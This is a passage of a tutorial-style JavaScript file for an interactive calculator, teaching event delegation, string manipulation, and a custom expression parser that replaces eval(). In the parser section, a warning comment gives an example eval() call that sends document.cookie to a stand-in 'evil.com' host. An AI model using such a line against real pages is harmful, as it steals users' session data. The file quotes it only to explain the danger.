/**
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║         INTERACTIVE GRID CALCULATOR — scripts/calculator.js      ║
 * ║                                                                    ║
 * ║  This file is structured as a tutorial with three core lessons:   ║
 * ║                                                                    ║
 * ║  LESSON 1 — Event Delegation (§3)                                 ║
 * ║    How to handle ALL button clicks with a SINGLE event listener   ║
 * ║    using the DOM's natural event-bubbling mechanism.              ║
 * ║                                                                    ║
 * ║  LESSON 2 — String Manipulation (§4–§5)                          ║
 * ║    How to build a mathematical expression as a plain string,      ║
 * ║    and the edge cases to guard against along the way.            ║
 * ║                                                                    ║
 * ║  LESSON 3 — Custom Math Parser (§6)                              ║
 * ║    Why not to use eval(), and how to write a recursive descent    ║
 * ║    parser that correctly respects operator precedence.            ║
 * ║                                                                    ║
 * ║  TABLE OF CONTENTS                                                ║
 * ║  ──────────────────                                               ║
 * ║  §1  Selecting DOM Elements                                       ║
 * ║  §2  Application State                                            ║
 * ║  §3  Event Delegation — the single listener                       ║
 * ║  §4  String Manipulation — the handler functions                  ║
 * ║  §5  Additional Input Handlers                                    ║
 * ║  §6  Custom Recursive Descent Parser                              ║
 * ║  §7  Display & UI Helpers                                         ║
 * ║  §8  Keyboard Support                                             ║
 * ║  §9  Initialization                                               ║
 * ╚══════════════════════════════════════════════════════════════════╝
 */

'use strict'; // Enable strict mode: turns silent JS errors into thrown errors.


/* ════════════════════════════════════════════════════════════════════
   §1. SELECTING DOM ELEMENTS
   ──────────────────────────────────────────────────────────────────
   We cache references to DOM nodes at startup rather than querying
   the DOM inside every function call.

   WHY? Every call to document.getElementById() scans the document.
   Caching the result in a variable means we pay that cost ONCE.
   For a calculator this is a minor concern, but the habit matters
   in larger applications with many DOM operations per second.
════════════════════════════════════════════════════════════════════ */
const expressionDisplay = document.getElementById('expression');   // The big number readout
const historyDisplay    = document.getElementById('history');      // The dim line above it
const buttonGrid        = document.getElementById('button-grid');  // THE parent container
const eventLog          = document.getElementById('event-log');    // Tutorial log <ul>
const logEmpty          = document.getElementById('log-empty');    // "Click a button..." hint


/* ════════════════════════════════════════════════════════════════════
   §2. APPLICATION STATE
   ──────────────────────────────────────────────────────────────────
   All mutable data lives in one plain object — the "single source
   of truth" pattern. The UI is always DERIVED from this object;
   we never read values back from the DOM to make decisions.

   This makes the application predictable:
     • To understand what the calculator will display, read state.
     • To change what the calculator displays, update state, then
       call updateDisplay() to sync the UI.
════════════════════════════════════════════════════════════════════ */
const state = {
  /**
   * The mathematical expression being built as a STRING.
   * This is the central data structure of the whole application.
   *
   * Examples of valid expression strings:
   *   ''          → display shows "0"
   *   '42'        → display shows "42"
   *   '12.5+3'    → display shows "12.5+3"
   *   '-7*4.5+2'  → display shows "-7×4.5+2"
   *
   * When '=' is pressed, this string is passed to our parser.
   */
  expression: '',

  /**
   * True immediately after pressing '='.
   * When this is true and the user presses a NUMBER key,
   * we clear the expression and start fresh — otherwise
   * typing "3" after a result of "14" would give "143".
   * But if the user presses an OPERATOR after '=', we
   * continue chaining from the result (e.g. result + 5).
   */
  justCalculated: false,
};

/**
 * The set of valid operator characters.
 * Using a Set gives us O(1) lookup time: `OPERATORS.has('+')` is
 * faster than `['+','-','*','/'].includes('+')` for large sets.
 * (Here the difference is negligible, but the habit is good.)
 */
const OPERATORS = new Set(['+', '-', '*', '/']);


/* ════════════════════════════════════════════════════════════════════
   §3. EVENT DELEGATION — LESSON 1
   ──────────────────────────────────────────────────────────────────
   This is one of the most important patterns in DOM programming.

   THE PROBLEM WITH NAIVE LISTENERS
   ─────────────────────────────────
   The obvious approach is to loop over every button and attach
   a listener to each:

       ❌  document.querySelectorAll('.btn').forEach(btn => {
               btn.addEventListener('click', handleClick);
           });

   Problems:
     1. MEMORY: This creates N separate listener objects in memory
        (N = number of buttons). For 20 buttons that's 20 listeners.
     2. DYNAMIC ELEMENTS: If a button is added to the DOM later,
        it won't have a listener — you'd need to re-run the loop.
     3. SETUP COST: querySelectorAll scans the entire DOM; this
        scales poorly in large applications.

   THE EVENT DELEGATION SOLUTION
   ──────────────────────────────
   Instead, we attach ONE listener to the PARENT container.
   When a button is clicked, the browser fires the click event
   on the button. The event then travels UP the DOM tree — this
   is called EVENT BUBBLING.

   Our single listener on #button-grid catches the bubbled event
   and uses `event.target` to determine which child was clicked.

   Visual of event bubbling:
     [button "7"] ← click fires here
          ↓ bubble
     [.button-grid] ← our ONE listener catches it here
          ↓ bubble (continues up to body, html, window)

   Benefits:
     ✅ 1 listener instead of N — minimal memory footprint
     ✅ Works for buttons added to the DOM after setup
     ✅ Centralized logic — easier to debug and maintain
════════════════════════════════════════════════════════════════════ */

/*
   We attach the listener to the PARENT, not to each button.
   The second argument is our callback function defined below.
*/
buttonGrid.addEventListener('click', handleButtonClick);


/* ════════════════════════════════════════════════════════════════════
   §3a. THE MAIN EVENT HANDLER
   ──────────────────────────────────────────────────────────────────
   This single function is the entry point for every button click.
   It reads the data attributes from the clicked button and routes
   control to the appropriate specialized handler.
════════════════════════════════════════════════════════════════════ */

/**
 * handleButtonClick — The one event listener callback.
 *
 * @param {MouseEvent} event  The click event, bubbled up from a child <button>.
 *
 * HOW DELEGATION WORKS STEP BY STEP:
 *  1. User taps the "7" button.
 *  2. Browser fires a click event with target = <button data-value="7">.
 *  3. The event bubbles to #button-grid.
 *  4. Our listener fires. event.target is STILL the original button.
 *  5. We read event.target.dataset.type → "number"
 *  6. We read event.target.dataset.value → "7"
 *  7. We route to handleNumber("7").
 */
function handleButtonClick(event) {
  /*
     event.target can be the button itself OR something inside it
     (e.g. a <span> inside a button). event.target.closest('.btn')
     walks UP the DOM from the clicked element until it finds an
     ancestor matching '.btn', or null if none exists.

     This is a defensive pattern — it handles inner elements
     without breaking our logic.
  */
  const button = event.target.closest('.btn');
  if (!button) return; // Click landed on the grid background — ignore it.

  /*
     dataset is a DOMStringMap containing all data-* attributes.
     <button data-type="number" data-value="7">
       → button.dataset.type  === "number"
       → button.dataset.value === "7"
  */
  const type  = button.dataset.type;
  const value = button.dataset.value;

  // ── Tutorial side effects ──────────────────────────────
  logEvent(type, value);          // Update the event log panel
  highlightNote(type);            // Highlight the relevant concept card
  triggerPressAnimation(button);  // Brief visual flash on the button
  // ──────────────────────────────────────────────────────

  /*
     Route to the correct handler.
     switch/case is clearer than a chain of if/else here because
     we're branching on a single variable with many possible values.
  */
  switch (type) {
    case 'number':   handleNumber(value);   break;
    case 'operator': handleOperator(value); break;
    case 'equals':   handleEquals();        break;
    case 'clear':    handleClear();         break;
    case 'decimal':  handleDecimal();       break;
    case 'sign':     handleSign();          break;
    case 'percent':  handlePercent();       break;
    default:
      console.warn(`Unrecognised button type: "${type}". Check data-type attribute.`);
  }
}


/* ════════════════════════════════════════════════════════════════════
   §4. STRING MANIPULATION HANDLERS — LESSON 2
   ──────────────────────────────────────────────────────────────────
   The core idea: we maintain `state.expression` as a plain STRING.
   Every button press either appends a character to this string,
   modifies it, or triggers evaluation of it.

   EXAMPLE SEQUENCE — user types "12 + 5 * 3 ="
   ─────────────────────────────────────────────
   After '1':    expression = "1"
   After '2':    expression = "12"
   After '+':    expression = "12+"
   After '5':    expression = "12+5"
   After '*':    expression = "12+5*"
   After '3':    expression = "12+5*3"
   After '=':    parseExpression("12+5*3") → 27  (not 51 — precedence!)
                 expression = "27"
════════════════════════════════════════════════════════════════════ */

/**
 * handleNumber — Appends a digit character to the expression string.
 *
 * STRING MANIPULATION USED:
 *   • Concatenation:  state.expression + digit
 *   • Replacement:    Overwrite "0" with the new digit (not "07")
 *
 * @param {string} digit  A single character: '0' through '9'
 */
function handleNumber(digit) {
  /*
     EDGE CASE 1: After pressing '=', the display shows the result.
     If the user now types a number, they're starting a NEW calculation,
     so we clear the old result first.
     BUT: if they press an operator after '=', handleOperator will
     allow the chain to continue, so we only reset on DIGITS here.
  */
  if (state.justCalculated) {
    state.expression   = '';
    state.justCalculated = false;
  }

  /*
     EDGE CASE 2: Prevent invalid leading zeros.
     "07" and "007" are not valid numbers (they're octal in some languages).
     If the current expression is exactly "0" and the user presses another
     digit, REPLACE the zero rather than appending.

     String comparison: state.expression === '0'
       → "0" + "5" would give "05"  ← WRONG
       → we replace: state.expression = "5" ← CORRECT
  */
  if (state.expression === '0' && digit !== '.') {
    state.expression = digit;
    updateDisplay();
    return; // Return early — skip the normal append below
  }

  /*
     NORMAL CASE: Append the digit to the string.
     String concatenation in JS is always left-to-right:
       "12" + "3"  → "123"  (a NEW string — strings are immutable)
  */
  state.expression += digit;
  updateDisplay();
}

/**
 * handleOperator — Appends an operator character to the expression string.
 *
 * STRING MANIPULATION USED:
 *   • slice(-1):   Peek at the last character of the string
 *   • slice(0,-1): Remove the last character from the string
 *   • Concatenation: Append the new operator
 *
 * @param {string} operator  One of: '+', '-', '*', '/'
 */
function handleOperator(operator) {
  /*
     If user presses an operator AFTER '=', they want to chain:
     e.g., "14" + "*" → "14*" (using the result as the first operand).
     So we allow this and simply turn off the "just calculated" flag.
  */
  state.justCalculated = false;

  /*
     EDGE CASE 1: Empty expression.
     We only allow a leading minus sign (for negative numbers like -5).
     "+3" or "*3" at the start make no sense.
  */
  if (state.expression === '') {
    if (operator === '-') {
      state.expression = '-';
      updateDisplay();
    }
    // Silently ignore +, *, / on an empty expression
    return;
  }

  /*
     EDGE CASE 2: Prevent consecutive operators like "5++3" or "5*+3".
     ─────────────────────────────────────────────────────────────────
     STRING TECHNIQUE: slice(-1) extracts the LAST character of a string.
       "12+"   .slice(-1)  → "+"
       "4.5*"  .slice(-1)  → "*"
       "hello" .slice(-1)  → "o"

     If the last character is already an operator, the user is CHANGING
     their mind (e.g. typed '+' but now wants '*'). We REPLACE the last
     character instead of appending.

     slice(0, -1) removes the last character:
       "12+"  .slice(0, -1) → "12"
       Then: "12" + "*"     → "12*"
  */
  const lastChar = state.expression.slice(-1);

  if (OPERATORS.has(lastChar)) {
    /*
       Guard: if the expression is ONLY a single '-' (e.g. user typed '-'
       to start a negative number), don't replace it with another operator.
       Only allow replacing with another '-' (changing sign intention).
    */
    if (state.expression.length === 1 && lastChar === '-') {
      if (operator === '-') {
        // '-' pressed again — they want to start with negative: keep '-'
        // (no change needed — expression stays '-')
      } else {
        // '*', '+', '/' pressed at position 1 after '-' — ignore it
      }
      updateDisplay();
      return;
    }

    // Replace the trailing operator with the new one
    state.expression = state.expression.slice(0, -1) + operator;
    updateDisplay();
    return;
  }

  // NORMAL CASE: Append the operator
  state.expression += operator;
  updateDisplay();
}

/**
 * handleDecimal — Appends a decimal point '.' to the expression string,
 * but only if the CURRENT NUMBER being typed doesn't already have one.
 *
 * STRING MANIPULATION USED:
 *   • split(): Divides the string into an array at each operator
 *   • includes(): Checks if a character exists in the current segment
 *
 * WHY IS THIS TRICKY?
 *   The expression can be something like "12.5+3.7". We need to check
 *   whether the number currently being typed (the segment after the
 *   last operator) already contains a decimal. We can't just check
 *   if the WHOLE expression contains '.', because "12.5+" + "." is
 *   perfectly valid — the '.' would start a NEW decimal.
 */
function handleDecimal() {
  state.justCalculated = false;

  /*
     STRING TECHNIQUE: split() on a RegExp.
     We split the expression at any operator character.
    //  The RegExp [+\-*/ 

//      Example:
//        "12.5+3"  .split(/[+\-*/]/)  →  ["12.5", "3"]
//        "12.5+3*" .split(/[+\-*/]/)  →  ["12.5", "3", ""]

//      The LAST element of this array is the number currently being entered.

//   */
  const segments     = state.expression.split(/[+\-*/]/);
  const currentNumber = segments[segments.length - 1];

  /*
     EDGE CASE 1: Current number already has a decimal.
     "3.1." would be invalid — block the second decimal.
  */
  if (currentNumber.includes('.')) {
    return; // Silently block double decimals
  }

  /*
     EDGE CASE 2: Expression is empty, or ends with an operator.
     "5+." should become "5+0." not "5+."
     We prepend "0" so the decimal starts as "0."
  */
  if (state.expression === '' || OPERATORS.has(state.expression.slice(-1))) {
    state.expression += '0';
  }

  state.expression += '.';
  updateDisplay();
}


/* ════════════════════════════════════════════════════════════════════
   §5. ADDITIONAL INPUT HANDLERS
════════════════════════════════════════════════════════════════════ */

/**
 * handleClear — Resets everything to the initial blank state.
 *
 * This is the simplest handler: overwrite the expression string
 * with an empty string. JavaScript strings are immutable — we're
 * not mutating the original, we're assigning a NEW empty string
 * to the variable.
 */
function handleClear() {
  state.expression     = '';  // New empty string
  state.justCalculated = false;
  historyDisplay.textContent = '';
  updateDisplay();
}

/**
 * handleSign — Toggles the sign of the last number in the expression.
 * "25" → "-25", "-25" → "25", "12+5" → "12+-5" (negates the 5).
 *
 * STRING MANIPULATION USED:
 *   • startsWith(): Check if string begins with '-'
 *   • slice(1):     Remove the first character (the minus sign)
 *   • Substring navigation via a manual character scan
 */
function handleSign() {
  if (!state.expression || state.expression === '0') return;

  /*
     Find the last operator in the expression, searching right-to-left.
     We start from index 1 (not 0) to skip a potential leading minus sign.
     Example: in "-7+5", the leading '-' at index 0 is NOT an operator
     separating two operands — it's the sign of -7.
  */
  let lastOperatorIndex = -1;
  for (let i = state.expression.length - 1; i >= 1; i--) {
    if (OPERATORS.has(state.expression[i])) {
      lastOperatorIndex = i;
      break; // Found the rightmost operator — stop searching
    }
  }

  if (lastOperatorIndex === -1) {
    /*
       No operator found (or only a leading '-'):
       The entire expression is a single number — toggle its sign directly.

       STRING TECHNIQUE: startsWith()
         "-42".startsWith('-')  → true  → remove it: "-42".slice(1) → "42"
         "42" .startsWith('-')  → false → add it: "-" + "42"         → "-42"
    */
    if (state.expression.startsWith('-')) {
      state.expression = state.expression.slice(1); // Drop the leading '-'
    } else {
      state.expression = '-' + state.expression;    // Prepend '-'
    }
  } else {
    /*
       Operator found at lastOperatorIndex:
       Split the expression at that point.
         "12+5" with operator at index 2:
           beforeOp = "12+"   (includes the operator)
           lastNum  = "5"
       Then toggle the sign of lastNum only.
    */
    const beforeOp = state.expression.slice(0, lastOperatorIndex + 1);
    const lastNum  = state.expression.slice(lastOperatorIndex + 1);

    if (!lastNum) return; // Nothing after the operator yet — ignore

    if (lastNum.startsWith('-')) {
      state.expression = beforeOp + lastNum.slice(1);       // "12+-5" → "12+5"
    } else {
      state.expression = beforeOp + '-' + lastNum;          // "12+5"  → "12+-5"
    }
  }

  updateDisplay();
}

/**
 * handlePercent — Converts the full expression to its percentage value.
 * "50" → "0.5", "200" → "2"
 *
 * We evaluate the current expression, divide by 100, and display
 * the result. This is one of the rare cases where we run the parser
 * mid-input rather than waiting for '='.
 */
function handlePercent() {
  if (!state.expression) return;

  try {
    // Remove any trailing operator before parsing
    let expr = state.expression;
    if (OPERATORS.has(expr.slice(-1))) expr = expr.slice(0, -1);

    const currentValue  = parseExpression(expr);
    const percentValue  = currentValue / 100;
    state.expression = String(roundResult(percentValue));
    updateDisplay();
  } catch {
    // Expression isn't parseable yet (e.g. just "12+") — silently ignore
  }
}

/**
 * handleEquals — Evaluates the expression string and shows the result.
 *
 * This is where Lesson 2 (String Manipulation) meets Lesson 3 (Parsing).
 * The string we've been building is finally handed to our custom parser.
 */
function handleEquals() {
  if (!state.expression) return;

  /*
     Clean up trailing operators before evaluating.
     "12+" would cause a parse error — strip the trailing '+'.
     STRING TECHNIQUE: slice(-1) to peek, slice(0,-1) to remove.
  */
  let expr = state.expression;
  if (OPERATORS.has(expr.slice(-1))) {
    expr = expr.slice(0, -1); // Remove trailing operator
  }

  // Need at least one operator to make an expression worth evaluating
  // (Otherwise just showing the number itself is fine — no error)
  try {
    const result = parseExpression(expr); // ← Lesson 3 happens here

    // Save the original equation to the history line
    historyDisplay.textContent = formatExpression(state.expression) + ' =';

    // Display the result as the new expression (for chaining)
    state.expression     = String(roundResult(result));
    state.justCalculated = true;

    updateDisplay(/* isResult = */ true); // Trigger the pop animation

  } catch (error) {
    // Something went wrong — show an error message
    expressionDisplay.textContent = 'Error';
    expressionDisplay.style.fontSize = '';
    state.expression     = '';
    state.justCalculated = false;
    console.error('Parse error:', error.message);
  }
}

/**
 * handleBackspace — Removes the last character from the expression.
 * Bound to the Backspace key in §8.
 *
 * STRING TECHNIQUE: slice(0, -1)
 *   Returns all characters EXCEPT the last one.
 *   "12345".slice(0, -1) → "1234"
 *   "1"    .slice(0, -1) → ""
 *   ""     .slice(0, -1) → ""  (no error — safe)
 *
 * This demonstrates that strings are IMMUTABLE in JavaScript.
 * We're not deleting a character from the string — we're creating
 * a brand-new string that contains all but the last character,
 * then assigning it to our variable.
 */
function handleBackspace() {
  if (state.justCalculated) {
    handleClear();
    return;
  }
  // Create a new string without the last character
  state.expression = state.expression.slice(0, -1);
  updateDisplay();
}


/* ════════════════════════════════════════════════════════════════════
   §6. CUSTOM RECURSIVE DESCENT PARSER — LESSON 3
   ──────────────────────────────────────────────────────────────────
   WHY NOT USE eval()?
   ───────────────────
   eval() is a JavaScript function that executes a string as code:
     eval('3+5*2')  → 13  ✓
     eval('alert("hacked!")')  → opens an alert  ✗
     eval('fetch("evil.com?data="+document.cookie)')  → data theft  ✗

   Even with sanitization, eval() is flagged by security linters,
   forbidden by Content Security Policies, and considered a code
   smell. We avoid it entirely by writing our own parser.

   HOW THE PARSER WORKS — Recursive Descent
   ──────────────────────────────────────────
   Mathematical expressions follow a GRAMMAR — a set of rules that
   define valid structures. We model that grammar with functions.

   OPERATOR PRECEDENCE governs evaluation order:
     2 + 3 * 4  =  2 + 12  =  14   (not 5 * 4 = 20)
   Multiplication and division must bind tighter than + and -.

   We model this with three levels of parsing:

   Level 1: parseAddSub()   → handles '+' and '-'  (LOWEST precedence)
   Level 2: parseMulDiv()   → handles '*' and '/'  (HIGHER precedence)
   Level 3: parseAtom()     → handles plain numbers (HIGHEST — leaf nodes)

   Each level calls the NEXT level to get its operands.
   Because parseMulDiv is called inside parseAddSub, all * and /
   operations are fully resolved BEFORE + and - see their operands.

   EXAMPLE TRACE — "2 + 3 * 4"
   ─────────────────────────────
   Tokens: [2, '+', 3, '*', 4]

   parseAddSub():
     left  = parseMulDiv()           → resolves to 2 (no * or / here)
     sees '+', advances cursor
     right = parseMulDiv()
              left = parseAtom() → 3
              sees '*', advances cursor
              right = parseAtom() → 4
              returns 3 * 4 = 12
     left = 2 + 12 = 14
   returns 14   ✓
════════════════════════════════════════════════════════════════════ */

/**
 * STEP 1: TOKENIZE
 * ─────────────────
 * Convert the raw expression STRING into an ARRAY of tokens.
 * A token is the smallest meaningful unit: a number or an operator.
 *
 * Example:
 *   "12.5+3*-2"  →  [12.5, "+", 3, "*", -2]
 *
 * @param {string} expr  The expression string (e.g. "12.5+3*-2")
 * @returns {Array}      Mixed array of numbers (float) and operators (string)
 *
 * STRING MANIPULATION USED:
 *   • RegExp with global flag (.match() returns all matches)
 *   • parseFloat() to convert numeric strings to real numbers
 */
function tokenize(expr) {
  /*
     THE TOKENIZER REGEX — explained character by character:

     /-?\d+\.?\d*|[+\-*\/]/g

     Part 1: -?\d+\.?\d*   → matches a number (with optional sign and decimal)
       -?      → optional minus sign (for negative numbers like -5, -3.14)
       \d+     → one or more digits (the integer part: "0", "12", "123")
       \.?     → optional decimal point
       \d*     → zero or more digits after the decimal ("", "5", "14")
       So it matches: "3", "42", "3.14", "-7", "-0.5"

     Part 2: |[+\-*\/]     → OR match any single operator
       The | means "or" — try pattern 1 first, fall back to pattern 2.
       [+\-*\/] is a character class matching +, -, *, /
       (The \ before - and / are escape characters)

     Flag g (global): Find ALL matches in the string, not just the first.

     Example: "2.5+-3.5".match(regex)
       → ["2.5", "+", "-3.5"]
       The regex sees "2.5" as a number, "+" as operator, "-3.5" as a
       negative number (the '-' is captured as part of the number pattern).
  */
  const TOKEN_REGEX = /-?\d+\.?\d*|[+\-*/]/g;
  const rawMatches  = expr.match(TOKEN_REGEX);

  if (!rawMatches || rawMatches.length === 0) {
    throw new Error(`No valid tokens found in expression: "${expr}"`);
  }

  /*
     Convert each matched string to its appropriate JavaScript type:
       "3.14" → parseFloat("3.14") = 3.14  (a number)
       "+"    → parseFloat("+")    = NaN   → keep as string "+"
  */
  return rawMatches.map(token => {
    const asNumber = parseFloat(token);
    return isNaN(asNumber) ? token : asNumber;
    //                                ↑ operator  ↑ number
  });
}

/**
 * STEP 2: PARSE AND EVALUATE
 * ───────────────────────────
 * Uses a closure to share the `tokens` array and `cursor` position
 * across three mutually-aware parsing functions.
 *
 * The cursor is an integer index into the tokens array.
 * It moves forward (is incremented) as we "consume" tokens.
 *
 * @param {string} expr  The cleaned expression string
 * @returns {number}     The computed numeric result
 */
function parseExpression(expr) {
  const tokens = tokenize(expr);
  let cursor = 0; // Our current position in the tokens array

  /* ── Level 1: Addition and Subtraction ─────────────────────────
     This is the outermost (lowest precedence) level.
     It handles + and - by calling parseMulDiv() for each operand,
     ensuring that * and / are fully resolved before + and - apply.
  ─────────────────────────────────────────────────────────────── */
  function parseAddSub() {
    let left = parseMulDiv(); // Get the first operand (may itself be a product)

    /*
       Process any remaining + or - tokens.
       Each iteration of this loop consumes one operator + one right-hand operand.
       This gives us LEFT-TO-RIGHT associativity:
         "10 - 3 - 2" → ((10 - 3) - 2) = 5  (not 10 - (3 - 2) = 9)
    */
    while (cursor < tokens.length &&
           (tokens[cursor] === '+' || tokens[cursor] === '-')) {

      const operator = tokens[cursor]; // Peek at the operator
      cursor++;                         // Advance past the operator (consume it)

      const right = parseMulDiv();      // Get the right operand

      // Apply the operation to accumulate the result
      if (operator === '+') left = left + right;
      if (operator === '-') left = left - right;
    }

    return left;
  }

  /* ── Level 2: Multiplication and Division ───────────────────────
     Higher precedence — called by parseAddSub to resolve its operands.
     By the time parseAddSub sees its operands, any * or / within them
     have already been fully computed here.
  ─────────────────────────────────────────────────────────────── */
  function parseMulDiv() {
    let left = parseAtom(); // Get the first number

    while (cursor < tokens.length &&
           (tokens[cursor] === '*' || tokens[cursor] === '/')) {

      const operator = tokens[cursor];
      cursor++;

      const right = parseAtom(); // Get the next number

      if (operator === '*') {
        left = left * right;
      }
      if (operator === '/') {
        if (right === 0) throw new Error('Division by zero is undefined.');
        left = left / right;
      }
    }

    return left;
  }

  /* ── Level 3: Atomic Numbers (leaf nodes) ───────────────────────
     The innermost level — just read and return a plain number.
     If we encounter anything that isn't a number at this point,
     the expression was malformed.
  ─────────────────────────────────────────────────────────────── */
  function parseAtom() {
    const token = tokens[cursor]; // Look at the current token

    if (typeof token !== 'number') {
      throw new Error(
        `Expected a number at position ${cursor}, but found: "${token}"`
      );
    }

    cursor++; // Consume this number token
    return token;
  }

  /* ── Kick off parsing from the top level ── */
  const result = parseAddSub();

  /*
     After parsing, the cursor should have consumed ALL tokens.
     If not, there's a structural problem (e.g. "3 4 +" — postfix notation).
  */
  if (cursor < tokens.length) {
    throw new Error(
      `Unexpected token "${tokens[cursor]}" at position ${cursor}.`
    );
  }

  return result;
}


/* ════════════════════════════════════════════════════════════════════
   §7. DISPLAY & UI HELPER FUNCTIONS
════════════════════════════════════════════════════════════════════ */

/**
 * updateDisplay — Reads `state.expression` and updates the DOM.
 *
 * THE GOLDEN RULE: Always derive the UI FROM state, not the other way around.
 * Never read values from DOM elements to make decisions.
 *
 * @param {boolean} [isResult=false]  Triggers the pop animation on '='
 */
function updateDisplay(isResult = false) {
  // Empty expression → show "0" as a placeholder
  const displayText = state.expression === '' ? '0' : state.expression;

  // Show human-readable symbols (× instead of *, ÷ instead of /)
  expressionDisplay.textContent = formatExpression(displayText);

  /*
     Auto-scale the font size for very long expressions.
     clamp(min, preferred, max) keeps the size within bounds.
     We set it directly as an inline style; CSS handles transitions.
  */
  const len = displayText.length;
  if (len > 14) {
    expressionDisplay.style.fontSize = 'clamp(1.1rem, 3.5vw, 1.6rem)';
  } else if (len > 10) {
    expressionDisplay.style.fontSize = 'clamp(1.4rem, 4vw, 2rem)';
  } else if (len > 7) {
    expressionDisplay.style.fontSize = 'clamp(1.7rem, 5vw, 2.4rem)';
  } else {
    expressionDisplay.style.fontSize = ''; // Reset to CSS default
  }

  // Trigger the pop animation after pressing '='
  if (isResult) {
    expressionDisplay.classList.add('animate-result');
    // Remove the class after the animation ends so it can replay next time
    setTimeout(
      () => expressionDisplay.classList.remove('animate-result'),
      400 // Must match the animation duration in CSS
    );
  }
}

/**
 * formatExpression — Replaces operator characters with readable symbols.
 *
 * IMPORTANT: This is purely cosmetic.
 * Internally we ALWAYS store '*' and '/', because those are what
 * the tokenizer regex and JavaScript arithmetic expect.
 * We only substitute display symbols at render time.
 *
 * @param {string} expr  Raw expression string (e.g. "12*3/2")
 * @returns {string}     Formatted string (e.g. "12×3÷2")
 */
function formatExpression(expr) {
  return expr
    .replace(/\*/g, '×') // Global replace: ALL '*' → '×'
    .replace(/\//g, '÷'); // Global replace: ALL '/' → '÷'
}

/**
 * roundResult — Fixes floating-point arithmetic oddities.
 *
 * WHY THIS IS NEEDED:
 *   0.1 + 0.2 in JavaScript = 0.30000000000000004
 *   This is because JavaScript (like most languages) stores decimals
 *   in IEEE 754 binary floating-point, which can't represent all
 *   decimal fractions exactly.
 *
 * TECHNIQUE: Multiply by a large power of 10, round to integer, divide back.
 *   0.30000000000000004 * 1e10 = 3000000000.0000004
 *   Math.round(3000000000.0000004) = 3000000000
 *   3000000000 / 1e10 = 0.3  ✓
 *
 * @param {number} n  The raw floating-point result
 * @returns {number}  Rounded to at most 10 decimal places
 */
function roundResult(n) {
  return Math.round(n * 1e10) / 1e10;
}

/**
 * triggerPressAnimation — Briefly adds a CSS class to a button
 * to trigger a visual flash effect, then removes it.
 *
 * @param {HTMLElement} button  The button element to animate
 */
function triggerPressAnimation(button) {
  button.classList.add('btn--pressed');
  // setTimeout delays the removal, giving the CSS animation time to play
  setTimeout(() => button.classList.remove('btn--pressed'), 160);
}

/**
 * logEvent — Adds an entry to the tutorial event log.
 *
 * Educational purpose: shows students that every click — regardless of
 * which button — is processed by the SAME listener on the parent grid.
 *
 * @param {string} type   Button type (e.g. "number", "operator")
 * @param {string} value  Button value (e.g. "7", "+")
 */
function logEvent(type, value) {
  const MAX_ENTRIES = 6; // Keep the log tidy

  // Hide the "Click a button..." placeholder on first use
  if (logEmpty) logEmpty.style.display = 'none';

  // Build the log entry HTML
  const li = document.createElement('li');
  /*
     SECURITY NOTE: escapeHtml() prevents XSS (Cross-Site Scripting).
     If `value` happened to contain HTML like "<script>", inserting it
     directly via innerHTML would execute the script. We escape it first.
  */
  const safeBadge = `<span class="log-type log-type--${escapeHtml(type)}">${escapeHtml(type)}</span>`;
  const safeValue = `<code>${escapeHtml(value)}</code>`;
  li.innerHTML = `${safeBadge} ${safeValue} →`;

  // Prepend so newest entries appear at the TOP of the list
  eventLog.insertBefore(li, eventLog.firstChild);

  // Prune old entries beyond the maximum
  while (eventLog.children.length > MAX_ENTRIES) {
    eventLog.removeChild(eventLog.lastChild);
  }
}

/**
 * highlightNote — Briefly activates a tutorial note card to draw
 * attention to the concept being demonstrated.
 *
 * @param {string} buttonType  The type of button that was clicked
 */
function highlightNote(buttonType) {
  // Map button types to which concept card they illustrate
  const conceptMap = {
    // Every click demonstrates event delegation
    number:   ['note-delegation', 'note-string'],
    operator: ['note-delegation', 'note-string'],
    decimal:  ['note-delegation', 'note-string'],
    sign:     ['note-delegation', 'note-string'],
    percent:  ['note-delegation', 'note-string'],
    clear:    ['note-delegation'],
    equals:   ['note-delegation', 'note-parser'], // '=' invokes the parser
  };

  const idsToHighlight = conceptMap[buttonType] || ['note-delegation'];

  // Remove any existing active state from all cards first
  document.querySelectorAll('.note-card').forEach(card => {
    card.classList.remove('note-card--active');
  });

  // Add the active class to each relevant card with a slight stagger
  idsToHighlight.forEach((id, index) => {
    setTimeout(() => {
      const card = document.getElementById(id);
      if (card) {
        card.classList.add('note-card--active');
        // Auto-remove after 1.8 seconds
        setTimeout(() => card.classList.remove('note-card--active'), 1800);
      }
    }, index * 120); // 120ms stagger between each card
  });
}

/**
 * escapeHtml — Sanitizes a string by replacing HTML-special characters
 * with their safe entity equivalents.
 *
 * This prevents XSS when inserting dynamic text into innerHTML.
 *   '&'  → '&amp;'
 *   '<'  → '&lt;'
 *   '>'  → '&gt;'
 *   '"'  → '&quot;'
 *   "'"  → '&#39;'
 *
 * @param {string} str  Untrusted string
 * @returns {string}    Safe HTML-encoded string
 */
function escapeHtml(str) {
  const entityMap = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
  };
  return String(str).replace(/[&<>"']/g, char => entityMap[char]);
}


/* ════════════════════════════════════════════════════════════════════
   §8. KEYBOARD SUPPORT
   ──────────────────────────────────────────────────────────────────
   Keyboard support is both a usability and accessibility win.
   We map keyboard keys to the same handler functions used by the
   mouse/touch buttons — no duplication of logic needed.

   We attach the listener to `document` (not the calculator) so
   it works regardless of where focus is on the page.
════════════════════════════════════════════════════════════════════ */
document.addEventListener('keydown', function (event) {
  const key = event.key;

  // Digits 0-9: key is the character itself ('0' through '9')
  if (key >= '0' && key <= '9') {
    handleNumber(key);

  } else if (key === '+') {
    handleOperator('+');

  } else if (key === '-') {
    handleOperator('-');

  } else if (key === '*') {
    handleOperator('*');

  } else if (key === '/') {
    /*
       preventDefault() stops the browser's default action for '/'.
       In some browsers, '/' opens the find bar — we don't want that.
    */
    event.preventDefault();
    handleOperator('/');

  } else if (key === '.' || key === ',') {
    // Both '.' and ',' are decimal separators in different locales
    handleDecimal();

  } else if (key === 'Enter' || key === '=') {
    event.preventDefault(); // Prevent form submissions on Enter
    handleEquals();

  } else if (key === 'Escape') {
    handleClear();

  } else if (key === 'Backspace') {
    event.preventDefault();
    handleBackspace();
  }

  // Visually highlight the matching on-screen button (if it exists)
  highlightMatchingButton(key);
});

/**
 * highlightMatchingButton — Finds the on-screen button matching a key press
 * and triggers its press animation for visual feedback.
 *
 * @param {string} key  The key that was pressed (from event.key)
 */
function highlightMatchingButton(key) {
